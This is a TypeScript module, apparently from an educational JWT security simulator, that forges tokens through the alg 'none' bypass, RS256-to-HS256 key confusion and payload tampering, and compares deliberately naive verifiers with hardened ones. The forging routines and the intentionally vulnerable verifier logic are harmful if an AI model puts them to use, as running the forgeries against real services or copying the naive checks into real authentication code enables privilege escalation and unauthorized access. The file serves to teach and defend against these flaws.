/**
 * TokenSmith Exploit & Vulnerability Simulator
 * Demonstrates real-world JWT vulnerabilities: alg: "none" bypass,
 * Algorithm Confusion (HMAC vs RSA), and token tampering.
 * Author: Jatin Sharma (https://jatinsh.netlify.app/)
 */

import { TokenCrypto } from './crypto.js';
import { ExploitSimulationResult } from '../types.js';

export class ExploitSimulator {
  /**
   * 1. Simulate the infamous `alg: "none"` bypass vulnerability (CVE-2015-9235)
   * The attacker changes the algorithm to "none" and strips the signature.
   */
  static simulateAlgNone(token: string): ExploitSimulationResult {
    try {
      const decoded = TokenCrypto.parseJWT(token);
      const forgedHeader = { ...decoded.header, alg: 'none' };
      const forgedPayload = { ...decoded.payload, role: 'superadmin', admin: true };

      const encHeader = TokenCrypto.base64UrlEncode(JSON.stringify(forgedHeader));
      const encPayload = TokenCrypto.base64UrlEncode(JSON.stringify(forgedPayload));
      const forgedToken = `${encHeader}.${encPayload}.`;

      // Naive Verifier: Decodes token and only checks signature IF alg !== 'none'
      const naiveVerifierAllowed = (() => {
        const parts = forgedToken.split('.');
        const h = JSON.parse(TokenCrypto.base64UrlDecode(parts[0]));
        if (h.alg === 'none' || h.alg === 'None') {
          return true; // Vulnerable: accepts unsigned token because alg is none!
        }
        return false;
      })();

      // Hardened Verifier: Explicitly rejects any 'none' algorithm
      const hardenedVerifierBlocked = (() => {
        const parts = forgedToken.split('.');
        const h = JSON.parse(TokenCrypto.base64UrlDecode(parts[0]));
        return h.alg.toLowerCase() === 'none'; // Blocked immediately
      })();

      return {
        attackType: 'alg-none-bypass',
        name: 'Unsigned Token (alg: "none") Privilege Escalation Bypass',
        description: 'Attacker modifies header alg to "none", grants themselves superadmin role, and removes signature.',
        forgedToken,
        vulnerableToNaiveVerifier: naiveVerifierAllowed,
        blockedByHardenedVerifier: hardenedVerifierBlocked,
        technicalDetails: 'Vulnerable verification libraries check if (header.alg === "none") and skip cryptographic signature verification entirely, allowing arbitrary payload tampering.'
      };
    } catch (e: any) {
      throw new Error(`Failed to simulate alg: none attack: ${e.message}`);
    }
  }

  /**
   * 2. Simulate Algorithm Confusion Attack (Asymmetric to Symmetric Key Confusion)
   * The server expects RS256 using an RSA key pair.
   * The attacker converts header to HS256 and signs the token with the server\'s public key as HMAC secret!
   */
  static simulateAlgorithmConfusion(
    token: string,
    mockPublicKey = '-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0TokenSmithMockKey\n-----END PUBLIC KEY-----'
  ): ExploitSimulationResult {
    try {
      const decoded = TokenCrypto.parseJWT(token);
      const forgedHeader = { ...decoded.header, alg: 'HS256' };
      const forgedPayload = { ...decoded.payload, role: 'admin', elevated: true };

      const encHeader = TokenCrypto.base64UrlEncode(JSON.stringify(forgedHeader));
      const encPayload = TokenCrypto.base64UrlEncode(JSON.stringify(forgedPayload));
      const signingInput = `${encHeader}.${encPayload}`;

      // Attacker signs using the public key as the HMAC secret
      const forgedSignature = TokenCrypto.signHmac('HS256', signingInput, mockPublicKey);
      const forgedToken = `${signingInput}.${forgedSignature}`;

      // Naive Verifier: uses whatever alg is in the header with the server's configured key
      const naiveVerifierAllowed = (() => {
        const h = JSON.parse(TokenCrypto.base64UrlDecode(forgedToken.split('.')[0]));
        if (h.alg === 'HS256') {
          // Naive server passes public key into generic verify function
          return TokenCrypto.verifyHmac('HS256', signingInput, forgedSignature, mockPublicKey);
        }
        return false;
      })();

      // Hardened Verifier: Enforces expected algorithm whitelist (e.g. ['RS256'] only)
      const expectedAllowedAlgorithms = ['RS256'];
      const hardenedVerifierBlocked = (() => {
        const h = JSON.parse(TokenCrypto.base64UrlDecode(forgedToken.split('.')[0]));
        return !expectedAllowedAlgorithms.includes(h.alg);
      })();

      return {
        attackType: 'algorithm-confusion',
        name: 'Asymmetric to Symmetric (RS256 to HS256) Key Confusion Attack',
        description: 'Attacker takes the public key, switches alg to HS256, and signs a forged payload using the public key as the HMAC secret.',
        forgedToken,
        vulnerableToNaiveVerifier: naiveVerifierAllowed,
        blockedByHardenedVerifier: hardenedVerifierBlocked,
        technicalDetails: 'When a verification function does not enforce an algorithm whitelist, passing an RSA public key into an HMAC verification algorithm allows the attacker to forge valid signatures.'
      };
    } catch (e: any) {
      throw new Error(`Failed to simulate algorithm confusion attack: ${e.message}`);
    }
  }

  /**
   * 3. Simulate Payload Tampering
   */
  static simulatePayloadTampering(token: string): ExploitSimulationResult {
    try {
      const parts = token.split('.');
      const payload = JSON.parse(TokenCrypto.base64UrlDecode(parts[1]));
      payload.admin = true;
      payload.email = 'attacker@hacker.io';

      const encPayload = TokenCrypto.base64UrlEncode(JSON.stringify(payload));
      // Reassemble with original signature (which is now invalid!)
      const forgedToken = `${parts[0]}.${encPayload}.${parts[2] || ''}`;

      return {
        attackType: 'payload-tampering',
        name: 'Direct Payload Mutation with Stale Signature',
        description: 'Attacker directly alters base64url payload without updating cryptographic signature.',
        forgedToken,
        vulnerableToNaiveVerifier: false,
        blockedByHardenedVerifier: true,
        technicalDetails: 'Cryptographic hash digests mismatch immediately upon payload bit mutation.'
      };
    } catch (e: any) {
      throw new Error(`Failed to simulate payload tampering: ${e.message}`);
    }
  }
}
